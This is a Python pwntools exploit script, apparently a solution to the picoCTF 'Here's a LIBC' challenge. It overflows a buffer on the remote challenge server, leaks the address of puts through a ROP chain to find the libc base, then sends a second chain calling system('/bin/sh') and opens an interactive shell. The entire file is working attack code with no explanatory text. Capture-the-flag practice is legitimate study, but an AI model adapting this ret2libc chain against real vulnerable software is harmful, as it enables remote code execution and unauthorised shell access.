from pwn import *
padding = b'@'*(0x80+8) 
#system_addr = p64(0x7ffff7a334e0)
#exit_addr = p64(0x7ffff7a271d0)
#bin_sh_addr = p64(0x7ffff79e4000 + 0x1b40fa)
# first, leak libc base
r = remote('mercury.picoctf.net', 42072)
#r = process('./vuln_patched')
#gdb.attach(r)
r.recvline() # banner
pop_rdi_gadget = p64(0x0000000000400913)
ret_gadget = p64(0x000000000040052e)
e = ELF('./heres_a_libc/vuln')
puts_got = p64(e.got['puts'])
puts_plt = p64(e.plt['puts'])
libc = ELF('./heres_a_libc/libc.so.6')
libc.address = 0x00

# leak
do_stuff_addr = p64(0x004006d8)
r.sendline(padding + pop_rdi_gadget + puts_got + puts_plt + do_stuff_addr)
r.recvline()
puts_addr = r.recvline(keepends=False)
while len(puts_addr) < 8:
    puts_addr += b'\x00'
puts_addr = u64(puts_addr)
print('puts address =', hex(puts_addr))
libc.address = puts_addr - libc.symbols['puts']
print('libc base address =', hex(libc.address))
#r = remote('mercury.picoctf.net', 42072)
#r = process('./vuln_patched')
# maybe @ (ascii 0x40) instead of 'a' (ascii 0x61) will help with alignment?
bin_sh_addr = p64(next(libc.search(b'/bin/sh\x00')))
system_addr = p64(libc.symbols['system'])
print(bin_sh_addr, system_addr)
payload = padding + pop_rdi_gadget + bin_sh_addr + ret_gadget + system_addr
#with open('payload', 'wb') as f:
#    f.write(payload+b'\n')
#gdb.attach(r)
r.sendline(payload)
r.interactive()

